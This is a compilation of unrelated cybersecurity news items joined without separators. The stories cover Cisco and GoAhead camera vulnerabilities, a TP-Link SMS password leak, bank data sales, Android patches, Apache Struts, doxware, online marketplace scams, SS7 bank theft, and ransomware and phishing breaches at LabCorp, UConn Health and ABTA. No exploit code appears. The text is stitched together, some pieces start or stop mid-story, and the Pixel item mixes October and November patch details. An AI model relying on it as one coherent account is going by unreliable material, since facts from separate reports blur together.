The company reported this week that some IOS XE releases were among 88 Cisco products vulnerable to the DoS attack on Linux systems known as FragmentSmack. 
And earlier this month it plugged a critical hard-coded password bug in its video surveillance software.
None of the flaws in the latest advisory is known to have been used in attacks and Cisco isn't aware of any public disclosures.
Some of the higher severity flaws include a DoS flaw affecting the IOS XE Web UI, which could allow a remote attacker to trigger a reload of the device by sending special HTTP requests to the UI.
An unauthenticated attacker could exploit this bug in IOS XE releases prior to 16.2.2, while 16.2.2 and later require authentication.
Another DoS flaw is rooted in the IPsec driver code of multiple Cisco IOS XE platforms and the Cisco ASA 5500-X Series Adaptive Security Appliance (ASA). The buggy code improperly processes malformed IPsec Authentication Header (AH) or Encapsulating Security Payload (ESP) packets.
""An attacker can exploit this vulnerability by using a crafted ESP or AH packet that meets several other conditions, such as matching the IPsec SA SPI and being within the correct sequence window,"" notes Cisco.
This flaw affects six ASR 1000 Series Aggregation Services Routers, and two 4000 Series Integrated Routers.
Cisco notes that its software is affected if the system has been modified from its default state and configured to terminate IPsec VPN connections, such as LAN-to-LAN VPN, and remote access VPN, but not SSL VPN.

A generic wireless camera manufactured by a Chinese company and sold around the world under different names and brands can be easily hijacked and/or roped into a botnet.
The flaw that allows this to happen is found in a custom version of GoAhead, a lightweight embedded web server that has been fitted into the devices.
This and other vulnerabilities have been found by security researcher Pierre Kim, who tested one of the branded cameras – the Wireless IP Camera (P2P) WIFICAM.
The extensive list of devices affected by the flaw in the custom embedded web server can be found here, and includes 1250+ camera models from over 300 vendors, including D-Link, Foscam, Logitech, Netcam, and Polaroid.
“This vulnerability allows an attacker to steal credentials, ftp accounts and smtp accounts (email),” Kim noted.
He also shared a PoC exploit that leverages the flaw to allow an attacker to achieve root shell on the device.
Other vulnerabilities present include a  RTSP server running on the camera’s TCP 10554 port, which can be accessed without authentication, allowing attackers to watch what the camera streams.
There is also a “cloud” functionality that is on by default, through which the camera can be managed via a mobile Android app.
The connection between the two is established through UDP, and will be automatically established to any app that “asks” if a particular camera is online.
Effectively, the attacker just needs to know the serial number of the device.
The established UDP tunnel can also be used by the attacker to dump the camera’s configuration file in cleartext, or to bruteforce credentials.
“The UDP tunnel between the attacker and the camera is established even if the attacker doesn’t know the credentials,” Kim noted.
“It’s useful to note the tunnel bypasses NAT and firewall, allowing the attacker to reach internal cameras (if they are connected to the Internet) and to bruteforce credentials.
Then, the attacker can just try to bruteforce credentials of the camera”.
Kim advises owners of these devices to disconnect them from the Internet.
A simple search with Shodan revealed that there are 185,000+ vulnerable cameras out there, ready to be hijacked.
The vulnerabilities are not in GoAhead, but the custom version of the web server developed by the Chinese OEM vendor, so EmbedThis – the company that develops GoAhead – can do nothing to fix this.
Interestingly enough, SecuriTeam revealed today the existence of an arbitrary file content disclosure vulnerability affecting older versions of the GoAhead web server.
Discovered by independent security researcher Istvan Toth, the vulnerability can be triggered by sending a malformed request to the web server, and it will disclose device credentials to the attacker in clear text.
“The GoAhead web server is present on multiple embedded devices, from IP cameras to printers and other embedded devices,” SecuriTeam explained, and urged owners to remove the device from the network, “or at the very least not allow access to the web interface to anyone beside a very strict IP address range”.

Cisco Systems yesterday issued 17 security advisories, disclosing vulnerabilities in multiple products, including at least three critical flaws. One of them, a privileged access bug found in seven models of its Small Business Switches, has not yet been patched, but the company has recommended a workaround to limit its potential for damage.
Designated CVE-2018-15439 with a CVSS score of 9.8, the unsolved privileged access vulnerability could allow a remote attacker to bypass an affected device’s user authentication mechanism and obtain full admin rights without the proper administrators being notified. Although there is currently no software fix, a Cisco advisory says users can implement a workaround by “adding at least one user account with access privilege set to level 15 in the device configuration.”
Affected device models are the Cisco Small Business 200 Series Smart Switches, Small Business 300 Series Managed Switches, Small Business 500 Series Stackable Managed Switches, 250 Series Smart Switches, 350 Series Managed Switches, 350X Series Stackable Managed Switches and 550X Series Stackable Managed Switches.
The other critical flaws confirmed in Cisco products were an authentication bypass vulnerability in the Stealthwatch Management Console of Cisco Stealthwatch Enterprise and a remote shell command execution bug in Unity Express. These also carry CVSS scores of 9.8.
Cisco published a fourth critical advisory warning of a remote code execution bug in the Apache Struts Commons FileUpload Library; however, it is unknown at this time if any Cisco products and services are affected.
Additional vulnerabilities were found in the Cisco’s Meraki networking devices, Video Surveillance Media Server, Content Security Management Appliance, Registered Envelope Service, Price Service Catalog, Prime Collaboration Assurance, Meeting Server, Immunet and AMP for Endpoints, Firepower System Software, Energy Management Suite and Integrated Management Controller Supervisor.
And in one final, odd advisory, Cisco acknowledged that a flub in its QA practices allowed dormant exploit code for the Dirty Cow vulnerability to be included in shipping software images for its Expressway Series and Cisco TelePresence Video Communication Server (VCS) software. 
“The presence of the sample, dormant exploit code does not represent nor allow an exploitable vulnerability on the product, nor does it present a risk to the product itself as all of the required patches for this vulnerability have been integrated into all shipping software images,” said the advisory. “The affected software images have proactively been removed from the Cisco Software Center and will soon be replaced with fixed software images.”

A particular TP-Link router model will spew out its admin password in cleatext to anyone that sends an SMS message to the router's SIM card with a particular script inside, according to German security researcher Jan Hörsch, who shared his findings with German newspaper Heise.de.
The vulnerability affects TP-Link model M5350, a 3G mobile Wi-Fi router, often distributed by mobile telco providers to their customers, along with a SIM card they insert in the router.
This SIM card allows the router to connect to the mobile operator's network, and just like any SIM card, has its own telephone number.
In an online conversation with Bleeping Computer, Hörsch, who's a researcher for German cyber-security firm Securai, says that after he analyzed the router's firmware, he discovered a vulnerability in the feature that handles incoming SMS messages.
By sending the following SMS, the router would answer back with the admin account password, the Wi-Fi network SSID, and the Wi-Fi network's password.
The issue isn't as dangerous as it sounds, mainly because the attacker needs to know the router SIM card's phone number in order to exploit it, Hörsch told Bleeping Computer.
This issue is one of many the researcher discovered in recent months in various devices. His findings were summarized and presented in a talk at the recently concluded Kaspersky Security Analyst Summit (SAS), held last week.
In the same talk, Hörsch also presented several other vulnerabilities that allowed him to obtain root access to Hootoo Travelmate and Trendnet TEW714TRU routers and Vstarcam webcams.
Other vulnerabilities the researcher discovered and presented at SAS include the presence of a hardcoded Telnet password in Startech modems, and a very simple to exploit authentication bypass for Panasonic BM ET200 retina scanners, which allowed anyone access to the admin panel just by deleting a few parameters in an URL.
His presentation also detailed several flaws in Western Digital MyCloud NAS hard drives, some of which were made public at the start of March by another researcher who disclosed the bugs.

Hackers are reportedly selling stolen data from the Qatar National Bank (QNB) and UAE InvestBank on the dark web. Both the banks suffered major data breaches in 2016 and the data of thousands of customers was later leaked online by hackers. Now, even as tensions escalate between the two Middle Eastern nations, cybercriminals appear to be cashing in on the underground cybercrime community.
Hackers hit the QNB in April 2016 and the UAE InvestBank in May 2016. The Sharjah-based InvestBank's stolen data was leaked online by a hacker going by the pseudonym ""Buba"", who demanded a $3m ransom from the bank. The stolen data, including customers' financial details as well as personal details such as full names, addresses, passport numbers, phone numbers, account numbers, credit card numbers along with their CVV codes and more was leaked online by the hacker after the bank refused to pay up the ransom.

In the case of the QNB, a hacker group going by the pseudonym ""Bozkurt Hackers"" claimed responsibility for the data breach. Hackers leaked 1.4GB data, which included customers' financial records, credit card numbers and PIN codes as well as banking details pertaining to the Al-Thani Qatar Royal Family and Al Jazeera journalists.
The stolen data from the QNB hack as well as the InvestBank data breach is now up for sale on an unspecified yet popular dark web marketplace, HackRead reported. This has not been independently verified by IBTimes UK.
InvestBank's data is allegedly being sold for a mere 0.0071 bitcoins ($18.86, £14.91). The data on sale includes bank accounts, card details, customer IDs, branch codes as well as account holders' full names.
The stolen and leaked data from the QNB, which the bank later acknowledged may have been accurate, is also on sale for 0.0071 bitcoins. The data listed for sale includes the previously leaked QNB records such as bank accounts as well as card and personal details of customers.
Dark web data sales from major breaches are not uncommon. In 2016, a series of major breaches affecting several leading tech firms including LinkedIn and Dropbox, eventually saw hackers selling hacked and stolen databases on the dark web.

If you own a Google Pixel or Google Pixel XL, you’re probably wondering where your November security patch update is. Although most Google devices — including older Nexus devices — received the patch at the beginning of the month as detailed below, the original Pixel lineup was left high and dry.
Today, finally, the patch is here. You can wait for the OTA to hit your device, or you can use the links below to manually install.
We’re not quite sure why this took so long, but hopefully, the December patch will be a bit more uniform.
Right on schedule, Google has released Android’s October security patch. As it’s the first update to make its way to the Pixel 3 and Pixel 3 XL, it should include some bug fixes. Unfortunately, it won’t resolve the memory issues just yet.
The November patch itself includes fixes for 17 security vulnerabilities. The most severe bugs included an issue in the media framework and the ability for a  remote attacker to execute arbitrary code through a crafted file. Fortunately, Google doesn’t believe that either of these were used to harm users.
The November security patch includes several bug fixes and improvements specifically for Pixel devices. As Google notes, this update should help with notification stability on Pixel 2 and Pixel 3 handsets as well as improve picture-in-picture performance on the four handsets.
Sadly, the November security patch will likely be the last update pushed to the Pixel C, Nexus 6P, and Nexus 5X. As Google only guarantees firmware upgrades for two years after a device is released and security patches for three, the search giant is no longer obligated to support the two phone or tablet.
Of course, this doesn’t mean that your devices are no longer usable. Even if you no longer get official support from Google, there are large developer communities that build ROMs that brings the latest security patches and Android features to all of Google’s abandoned devices.
If you don’t want to wait for the November security patch to make its way to your phone, you can download the latest factory image or OTA file from the links below. From there, you can either flash a fresh build to your phone or sideload the OTA update.
The November security patch is also making its way to the Essential Phone. In addition to the resolved issues addressed above, this update brings support for the company’s Audio Adapter HD module.

The bug was found in the core infrastructure of Apache Struts 2. 
The Apache Software Foundation has patched a critical security vulnerability which affects all versions of Apache Struts 2.
Uncovered by researchers from cybersecurity firm Semmle, the security flaw is caused by the insufficient validation of untrusted user data in the core Struts framework.
When Apache Struts uses results with no namespace and in the same time, upper actions have no wild namespace. The same opportunity for exploit exists when the URL tag is in use and there is no value or action set.
As the bug, CVE-2018-11776, has been discovered in the Struts core, the team says there are multiple attack vectors threat actors could use to exploit the vulnerability.
If the alwaysSelectFullNamespace flag is set to true in the Struts configuration, which is automatically the case when the Struts Convention plugin is in use, or if a user's Struts configuration file contains a tag that does not specify the optional namespace attribute or specifies a wildcard namespace.
Man Yue Mo from the Semmle Security Research Team first reported the flaw.
""This vulnerability affects commonly-used endpoints of Struts, which are likely to be exposed, opening up an attack vector to malicious hackers,"" Mo says. ""On top of that, the weakness is related to the Struts OGNL language, which hackers are very familiar with, and are known to have been exploited in the past.""
The vulnerability affects all versions of Apache Struts 2.
Companies which use the popular open-source framework are urged to update their builds immediately. Users of Struts 2.3 are advised to upgrade to 2.3.35; users of Struts 2.5 need to upgrade to 2.5.17.
As the latest releases only contain fixes for the vulnerability, Apache does not expect users to experience any backward compatibility issues.
""Previous disclosures of similarly critical vulnerabilities have resulted in exploits being published within a day, putting critical infrastructure and customer data at risk,"" Semmle says. ""All applications that use Struts are potentially vulnerable, even when no additional plugins have been enabled.""
Mo first reported the findings in April. By June, the Apache Struts team published the code which resolved the problem, leading to the release of official patches on August 22.

In recent years, ransomware has become a growing concern for companies in every industry.
Between April 2015 and March 2016, the number of individuals affected by ransomware surpassed 2 million — a 17.7% increase from the previous year.
Ransomware attacks function by breaching systems, usually through infected email, and locking important files or networks until the user pays a specified amount of money.
According to FBI statistics cited in a Malwarebytes report, hackers gained more than $209 million from ransomware payments in the first three months of 2016, putting ransomware on track to rake in nearly $1 billion this year.
But as a result of increased ransom-avoidance, cybercriminals have created an even more insidious threat.
Imagine malware that combines ransomware with a personal data leak: this is what the latest threat, doxware, looks like.
With doxware, hackers hold computers hostage until the victim pays the ransom, similar to ransomware.
But doxware takes the attack further by compromising the privacy of conversations, photos, and sensitive files, and threatening to release them publicly unless the ransom is paid.
Because of the threatened release, it's harder to avoid paying the ransom, making the attack more profitable for hackers.
In 2014, Sony Pictures suffered an email phishing malware attack that released private conversations between top producers and executives discussing employees, actors, industry competitors, and future film plans, among other sensitive topics.
And ransomware attacks have claimed a number of recent victims, especially healthcare systems, including MedStar Health, which suffered a major attack affecting 10 hospitals and more than 250 outpatient centers in March 2016.
Combine the data leak of Sony and the ransomware attack on MedStar and you can see the potential fallout from a doxware attack.
Doxware requires strategic, end-to-end planning, which means hackers will target their victims more deliberately.
Looking at the data leaked from Sony, it's easy to imagine the catastrophic effect doxware would have on an executive of any major corporation.
Company leaders hold countless conversations over email each day on sensitive topics ranging from product development to competition to internal politics, and if there's a doxware attack, the fallout could be extensive.
Expect Things to Get WorseThe technology behind doxware is still new, but expect the problem to become worse.
Recent attacks have been contained to Windows desktop computers and laptops, but this will certainly change.
Once the malware can infiltrate mobile devices, the threat will become even more pervasive, with text messages, photos, and data from apps at risk for being leaked.
It's also highly likely that doxware will target more types of files.
Workplace emails are currently a big target for hackers.
However, a company's internal communications/instant messaging network is also appealing to hackers using doxware, as the messaging network often serves as a platform where both sensitive business discussion and casual conversations take place, potentially exposing both company secrets and personally embarrassing exchanges.
One of these variants hold files ransom with the threat of release and then steals a victim's passwords.
Another mutation, Popcorn Time, takes doxware even further giving victims the option to infect two of their friends with the malware instead of paying the ransom.

Amazon buyers are being targeted by clever scammers that either set up independent seller accounts or hijack those of already established, well-reputed sellers, then offer pricy items at unbeatable prices.
In an example offered by Comparitech’s Lee Munson, the item in question is a big LCD TV that is usually sold at around £2,300, but the scammer offers it at almost half the price for a “used – like new” item.
But when the potential victim tries to buy it, Amazon throws up an error, saying that there was a problem with the item in the order.
A determined buyer will try to contact the seller through Amazon’s in-house messaging system, but the seller will push to move the conversation off it by offering a contact email address.
Munson’s email exchange with the scammer shows that the latter insists that by contacting them directly the problem has been solved, and that an order confirmation will be sent to the buyers’ email address.
The order confirmation looks like it came from Amazon (it appears to come from the auto-confirm@amazon-payments-support.co.uk email address), but was in fact sent by the scammer.
The order instructs the user to pay via direct bank transfer, to a private bank account – seemingly through Amazon Payments, but actually not.
Once the victims make the payment in the way they have been instructed, it’s game over.
They have parted with their money, and Amazon won’t refund them as the payment hasn’t been effected through their payment system.
“Payment within the Amazon.co.uk site is the only authorised and recognised form of payment for items sold by Sellers on Amazon.co.uk.
Every customer who orders on Amazon.co.uk is covered by our A-to-z guarantee; however items paid for outside of the Amazon.co.uk Marketplace aren’t eligible for protection,” the company noted, and advised customers to report this type of sellers to them.
But even that is not enough to stop these scammers, and they set up new accounts almost immediately after old ones have been blocked, as evidenced in this post on a Kindle Help Forum.
Obviously, Amazon must find a way to spot these schemes and take these accounts down much sooner.

A group of thieves exploited weaknesses in Signaling System 7 (SS7) to drain users’ bank accounts, including those protected by two-step verification (2SV).
On 3 May, a representative with O2 Telefonica, a provider of mobile phones and broadband, told German newspaper Süddeutsche Zeitung that thieves managed to bypass security measures and make unauthorized withdrawals from customers’ bank accounts:
    “Criminals carried out an attack from a network of a foreign mobile network operator in the middle of January. The attack redirected incoming SMS messages for selected German customers to the attackers.”
The thieves pulled off their heist by exploiting the weak underbelly of SS7. It’s a protocol that specifies how public switched telephone networks (PSTN) exchange data over digital signaling network. In simpler terms, SS7 helps phone carriers around the world route your calls and text messages.
Useful! Unfortunately, it’s also terribly insecure.
That’s what researchers Tobias Engel and Karsten Nohl found back in 2014. Specifically, the duo discovered flaws in the protocol that allowed an attacker to intercept a victim’s mobile phone calls as well as use a radio antenna to pick up all of a local user’s phone calls and texts.
Along the researchers’ observations, the January attackers first compromised users’ computers with malware that stole their bank account numbers, login credentials, and mobile phone numbers. The Register reports that these criminals then waited until the middle of the night to spring into action.
For those accounts protected by SMS-based 2SV (not to be confused with 2FA), the attackers abused SS7 to redirect customers’ SMS text messages to phone numbers under their control. This exploit allowed the thieves to steal users’ mobile transaction authentication numbers (mTAN) and thereby withdraw money from their accounts.
In the aftermath of the attack, authorities blocked the unidentified foreign network exploited by the attackers. Bank officials also notified customers of the unauthorized withdrawals.
But that’s not all. Some people are now calling on the FCC to fix the (finally!) fix the issues affecting SS7. One of them is U.S. Representative Ted Lieu, who made his position clear to Ars Technica:
    “Everyone’s accounts protected by text-based two-factor authentication, such as bank accounts, are potentially at risk until the FCC and telecom industry fix the devastating SS7 security flaw. Both the FCC and telecom industry have been aware that hackers can acquire our text messages and phone conversations just knowing our cell phone number. It is unacceptable the FCC and telecom industry have not acted sooner to protect our privacy and financial security. I urge the Republican-controlled Congress to hold immediate hearings on this issue.”
Let’s hope we finally get some movement on these security flaws. In the meantime, users might want to reconsider using SMS messages as a means of 2SV. They might want to go with an app like Google Authenticator or choose a solution like the U2F Security Key instead.

LabCorp experienced a breach this past weekend, which it nows says was a ransomware attack. The intrusion has also prompted concerns that patient data may have also been stolen. 
One of the biggest clinical lab testing companies in the world, LabCorp, was hit with a ""new variant of ransomware"" over the weekend.
""LabCorp promptly took certain systems offline as a part of its comprehensive response to contain and remove the ransomware from its system,"" the company told PCMag in an email. ""We are working to restore additional systems and functions over the next several days.""
LabCorp declined to say what variant of ransomware was used. But according to The Wall Street Journal, the company was hit with a strain known as SamSam.
In March, the same strain attacked the city of Atlanta's IT network. Like other ransomware variants, SamSam will effectively lock down a computer, encrypting all the files inside, and then demand the victim pay up to free the system. In the Atlanta attack, the anonymous hackers demanded $51,000, which the city government reportedly refused to pay.
How much the hackers are demanding from LabCorp isn't clear; the company declined to answer further questions about the attack or if it will pay the ransom.
The lab testing provider first reported the breach on Monday, initially describing it as ""suspicious activity"" on the company's IT systems that relate to healthcare diagnostics. This prompted fears that patient data may have been stolen. The North Carolina-based company processes more than 2.5 million lab tests per week and has over 1,900 patient centers across the US.
""LabCorp also has connections to most of the hospitals and other clinics in the United States,"" Pravin Kothari, CEO of cybersecurity firm CipherCloud, said in an email. ""All of this presents, at some point, perhaps an increased risk of cyber attacks propagating and moving through this expanded ecosystem.""
On Thursday, LabCorp issued a new statement and said the attack was a ransomware strain. At this point, the company has found ""no evidence of theft or misuse of data,"" but it's continuing to investigate.
""As part of our in-depth and ongoing investigation into this incident, LabCorp has engaged outside security experts and is working with authorities, including law enforcement,"" the company added.

Like any community, the Internet has dark alleys and sketchy places it is best to avoid.
Granted, anyone with a connected mobile device is at risk of having his or her private personal and financial information stolen and misused.
But dangerous software and applications often lurk in specific corners of cyberspace, where a touch of a button can have disastrous consequences.
These sites may have a web address that’s similar to legitimate sites but contain misspellings, bad grammar or low-resolution images, according to McAfee Labs, which is the threat research division of Intel Security.
Double check URLs to make sure that sites are authentic and not replicas created by scammers to try to steal personal information.
A scam currently making the rounds is a message that shows up in people’s in-boxes purporting to be from Netflix.
But in reality, it’s a “phishing” scheme intended to steal people’s log-in and credit card information.
Apple.com, obviously, is a well-known and trustworthy source of content.
The fake address, however, is not visible when the message is viewed on a cell phone.
That “s” makes all the difference, because it signals that a site has security encryption.
Legitimate e-commerce sites use encryption to keep customers’ payment information safe.
To confirm it is a trusted site, look for on a lock symbol in the browser window.
Consumers also should try to restrict their downloads to official and reputable app stores, such as the Apple Store, the Google Play Store and Amazon, said Scot Ganow, an attorney with Dayton-based law firm Faruki Ireland Cox Rhinehart & Dusing whose practice focuses on information privacy and security law.
More than 1 million Android phones were infected by a yucky type of malware dubbed “Googlian” that consumers downloaded from third-party apps and by clicking on malicious links, experts said.
The malware campaign has exposed people’s messages, documents, photographs and other sensitive data and also led to the installation of unwanted apps their devices, according to Check Point, a threat prevention software company.

If you sell items online, beware scammers who are hacking into websites and taking over real users' accounts.
Casundra Venable told FOX59 she has sold on eBay for five years with no problems, but recently she fell victim to a scam.
Venable was selling a Samsung phone with accessories on the website. Her sale closed, she received a $227 payment, and then a message that she thought was from the buyer.
""Thanks so much for (an) interesting auction. It was hard to choose the present for my friend. I think my friend will love this,"" Venable said, reading the message.
The writer sent her supposed friend's address, and Venable sent the package to that address. A few days later, she received a message from eBay saying the buyer had not received the package. It was then that she realized the message had been a fake.
""I thought, you know, 'How stupid (was I) for doing it?"" Venable said.
Venable said she was on the lookout for scams, but only those that come from people outside the eBay website. She assumed that because the message came through a real account, it was legitimate. It turns out, the scammer hacked into a real user's account and used it to find a closing sale, then pretended to be the buyer.
""If they ask you to send it somewhere besides their registered address, say no,"" Venable said.
FOX59 spoke with the Better Business Bureau's Tim Maniscalo, who said that while he had not heard of this specific type of eBay scam, it didn't surprise him.
""Well over 50 percent of the scams (we see) now are perpetrated in some way, shape, or form through the internet,"" Maniscalo said.
Venable tried to get her package back, but she could not get it from the warehouse in Brooklyn, New York where it ended up.
""(A man on the phone) said it’s off to the country of Georgia,"" Venable said.
An eBay spokesperson confirmed this scam to FOX59, saying a hacker was involved. The company also sent an alert to Venable, but it was too late. The spokesperson sent this statement:
""This incident was a scam and was the result of an unauthorized takeover of another user’s account. Unfortunately, scam artists will gain access to eBay member accounts through phishing emails in order to defraud other members. Criminals often exploit well-known, trusted brand names like eBay to attract consumers and then lure them into fraudulent transactions. We always encourage all our shoppers to be cautious and vigilant when executing a transaction on eBay. Members can prevent account takeovers from occurring by having frequent virus and spyware scans done on their account, regularly updating their passwords, and confirming a message was sent by eBay by checking their “My Messages” within their eBay account.""

Cyber Monday is here! If you avoided the retail stores and skipped their Black Friday deals, don't worry, you'll get another chance for major savings today. From clothing to travel to exclusive online-only deals, Cyber Monday still has tons to offer.
But just in time for the Cyber Monday shopping rush, watch out for sinister phishing scams that are making the rounds.
With more online shoppers this time around - searching every nook and cranny of the web in search of the best Cyber Monday deals - crooks are again looking to dupe unsuspecting bargain hunters.
Stop and Think, Did I order this?
One of the most effective tools for a cybercriminal is the phishing scam. This is when a scammer poses as a trustworthy entity and tries tricking you into clicking on a malicious link.
Their ultimate goal, of course,  is to steal your sensitive information such as credit card details, usernames and passwords.
With this year's holiday online shopping numbers projected to be the biggest ever, millions of items will be processed and shipped.
With this surge in shipping activity, consumer protection groups are warning everyone to watch out for fake delivery notices and package verification scams.
For example, if you receive an email from ""Amazon"" saying that you have a pending delivery that needs verification from you, then that is most likely a phishing scam.
Other email phishing scams may also pretend to provide you with a link for shipping updates or special discount coupons and offers.
Another popular ploy is the phantom order scam. These alarming emails are meant to get you clicking by pretending you ordered thousands of dollars of merchandise.
But before you click that link,  look out, these deceitful messages can be extremely convincing.
Fake delivery and shipping notifications can look just like the real thing, using real logos and art from company websites.
These cybercriminals will even set up fake websites that look like the real deal to lure you into giving away your personal information and credit card details.

Fake “mods” for Minecraft, the wildly popular pixelated sandbox game for kids, have turned up in Google Play.
Mods, short for modifications, are add-ons for games that change the functionality or add additional levels or features. There are many, many legitimate mods out there for all kinds of games, including Minecraft. But in this case, a bevy rogue apps offer more sinister changes. Android gamers that fall for them will find themselves bombarded with aggressive ads and scam activity, according to ESET.
ESET said that players have been exposed to 87 fake mods, and up to 990,000 users have installed them. These fall into two buckets: Ad-displaying downloaders (there are so far 14 of these that ESET has uncovered, with 80,000 installs and counting), and fake apps redirecting users to scam websites (73 apps and 910,000 installs).
The downloaders are for now merely plying unfortunate users with in-your-face ads. But that could easily change.
“Since [this] is able to download any sort of additional malware to the victim’s device, there is no reason to believe malware authors would stop at only displaying unwanted ads,” researchers noted. “Seeing they can lure thousands of users into installing their deceptive applications, more dangerous threats distributed under similar disguise might be the next logical step.”
As for the latter, “once launched, the apps display a screen with a download button,” ESET researchers said. “Clicking the button does not download any mods; instead, it redirects the user to a website opened in a browser and displays all kinds of obtrusive content.”
In terms of how to tell the mod from the con, reviews are, as usual, a handy barometer: The downloader versions for instance are spamming victims with ads, so poor reviews are the norm. Mobile security products should also detect the malicious apps prior to download.
This isn’t the first time the bad guys have targeted Minecraft—it is, after all, a pop culture phenomenon for elementary school kids and tweens. In 2015, ESET researchers discovered more than 30 fake applications in Google Play, which pretended to be cheats for the popular world-building-with-pixels game. And in 2014, a trojanized version of the Android Minecraft PE app was found being sold at half the official price through third party Russian app stores.
To clean a device of the downloaders, ESET said that users must first deactivate device administrator rights for both the app and the downloaded module (found under Settings -> Security -> Device administrators). Then, users can uninstall the apps by going to Settings -> Application Manager. For the scam app, victims can just uninstall the app in Settings -> Application Manager.

Phishing and other hacking incidents have led to several recently reported large health data breaches, including one that UConn Health reports affected 326,000 individuals.
In describing a phishing attack, UConn Health says that on Dec 24, 2018, it determined that an unauthorized third party illegally accessed a limited number of employee email accounts containing patient information, including some individuals' names, dates of birth, addresses and limited medical information, such as billing and appointment information. The accounts also contained the Social Security numbers of some individuals.
Several other healthcare entities also have recently reported to federal regulators data breaches involving apparent phishing and other email-related attacks.
""All of these incidents speak to the rampant attacks we are seeing across healthcare, and yet organizations are still not investing enough in protection or detection,"" says Mac McMillan, CEO of security consulting firm CynergisTek. 

UConn Health, an academic medical center, says in a media statement that it identified approximately 326,000 potentially impacted individuals whose personal information was contained in the compromised email accounts. For approximately 1,500 of these individuals, this information included Social Security numbers.
""It is important to note that, at this point, UConn Health does not know for certain if any personal information was ever viewed or acquired by the unauthorized party, and is not aware of any instances of fraud or identity theft as a result of this incident,"" the statement notes. ""The incident had no impact on UConn Health's computer networks or electronic medical record systems.""
UConn Health is offering prepaid identity theft protection services to individuals whose Social Security numbers may be impacted. The organization says it has notified law enforcement officials and retained a forensics firm to investigate the matter.

Once the U.S.Department of Health and Human Services confirms the details, the attack on UConn Health could rank as the second largest health data breach reported so far this year, based on a snapshot of its HIPAA Breach Reporting Tool website on Monday.
The largest health data breach revealed so far this year, but not yet added to the tally, affected University of Washington Medicine. UW Medicine says a misconfigured database left patient data exposed on the internet for several weeks last December, resulting in a breach affecting 974,000 individuals.

Several other phishing and hacking incidents have been added to the HHS ""wall of shame"" tally in recent weeks.
Among those is a hacking incident impacting 40,000 individuals reported on Feb 1 by Minnesota-based Reproductive Medicine and Infertility Associates. In a statement, the organization notes that on Dec 5, 2018, it discovered it had been the target of a ""criminal malware attack.""
An RMIA practice manager tells Information Security Media Group that independent computer forensics experts removed the malware, but did not definitively determine how the malware infection was launched. The practice suspects the malware was likely embedded in an email attachment, he says.
RMIA's statement notes that while the investigation did not identify any evidence of unauthorized access to anyone's personal information, ""we unfortunately could not completely rule out the possibility that patients' personal information, including name, address, date of birth, health insurance information, limited treatment information and, for donors only, Social Security number, may have been accessible.""
In the aftermath of the incident, RMIA says it's adding another firewall, requiring changes to user credentials/passwords, implementing dual-factor authentication and providing additional staff training regarding information security.""

Also reporting a hacking incident in recent weeks was Charleston, S.C.-based Roper St.Francis Healthcare, which operates several hospitals in the region. The attack was reported as impacting nearly 35,300 individuals.
In a Jan 29 statement, the entity says that on Nov 30, 2018, it learned that an unauthorized actor may have gained access to some of its employees' email accounts between Nov 15 and Dec 1, 2018 , ""Our investigation determined that some patient information may have been contained in the email accounts, patients' names, medical record numbers, information about services they received from Roper St.Francis, health insurance information, and, in some cases, Social Security numbers and financial information,"" the statement says.
For those patients whose Social Security number was potentially exposed, the organization is offering prepaid credit monitoring and identity protection services.
""To help prevent something like this from happening again, we are continuing education with our staff on email protection and enhancing our email security,"" Roper St. Francis says.

As phishing continues to menace healthcare entities, covered entities and business associates need to keep up with their defenses, some experts note.
""Phishing techniques have become more sophisticated than in the past,"" note Kate Borten, president of security and privacy consulting firm The Marblehead Group. ""Workforce training should include simulated phishing attacks to make people better prepared to recognize and thwart a real attack.""
To help mitigate breach risks, organizations should be deploying next-generation firewalls and multifactor authentication, plus employing advanced malware detection solutions, McMillan says.
Too many organizations are overlooking the value of multifactor authentication, Borten adds.
""Two-factor user authentication was intended to be required over the internet and public networks in the proposed HIPAA Security Rule,"" she notes. ""Unfortunately, since that requirement was dropped in the final rule, healthcare is lagging on multifactor authentication, which is easier now than ever to implement.""
But McMillan advises healthcare organizations to avoid using multifactor authentication systems that use SMS to transmit a one-time password because those messages can be intercepted. ""The software- or hardware-based solutions are preferred,"" McMillan says.
So what other technologies or best practices should covered entities and business associates consider to prevent falling victim to phishing and other attacks?
""Unfortunately we haven't seen any silver bullets here yet, but one thing we might want to begin exploring is just what an attacker has access to when they compromise a user's account,"" McMillan notes.
""All too often, we hear that the accounts compromised had incredibly large numbers of emails immediately accessible to the attacker. The question is, are their better ways to deal with retention that mitigate risk as well?""

Specialist technical consultants subsequently confirmed that the web server had been accessed.
We are not aware of any information being shared beyond the infiltrator.
We are actively monitoring the situation, but as a precautionary measure we are taking steps to warn both customers of ABTA Members and ABTA Members who have the potential to be affected.
We are today contacting these people and providing them with information and guidance to help keep them safe from identity theft or online fraud.
We have also alerted the relevant authorities, including the Information Commissioner and the Police.
I would personally like to apologise for the anxiety and concern that this incident may cause to any customer of ABTA or ABTA Member who may be affected.
It is extremely disappointing that our web server, managed for ABTA through a third party web developer and hosting company, was compromised, and we are taking every step we can to help those affected.
I will personally be working with the team to look at what we can learn from this situation.
Outlined below, we have answered further questions, which include some guidance for customers of ABTA and ABTA Members.
We recently became aware of unauthorised access to the abta.com web server by an external infiltrator.
This was possible due to a system vulnerability that the infiltrator exploited to access some data provided by some customers of ABTA Members and by ABTA Members themselves.
On immediate investigation, we identified that although ABTA’s own IT systems remained secure, there was a vulnerability to the web server for abta.com, which is managed for ABTA through a third-party web developer and hosting company.
As a precautionary measure we have taken steps to warn Members and customers of ABTA Members who have the potential to be affected.
We have contacted those people and provided them with information and guidance to help keep them safe from identity theft or online fraud.
These steps include two dedicated helplines, for customers of ABTA Members and for ABTA Members, and free access to an identity theft protection service offered by Experian.
We have also alerted the relevant authorities, including the Information Commissioner and the Police.
The unauthorised access may have affected approximately 43,000 individuals.
Around 1,000 of these are files that may include personal identity information of customers of ABTA Members (in support of their complaint about an ABTA Member), uploaded since 11 January 2017; around 650 may include personal identity information of ABTA Members.
The vast majority of the 43,000 relate to people who have registered on abta.com, with email addresses and encrypted passwords, or have filled in an online form with basic contact details which are types of data at a very low exposure risk to identity theft or online fraud.
We have provided specific guidance information, including contact details for a dedicated helpline to assist with any further questions.

A group of hackers are allegedly threatening to remotely wipe millions of iPhones and iCloud accounts, unless Apple agrees to pay a ransom by April 7th.
As Motherboard reports, the hackers – who are calling themselves the “Turkish Crime Family” – are demanding Apple pay a ransom of $75,000 (in either the Bitcoin or Ethereum cryptocurrencies), or hand over $100,000 worth of iTunes gift cards.
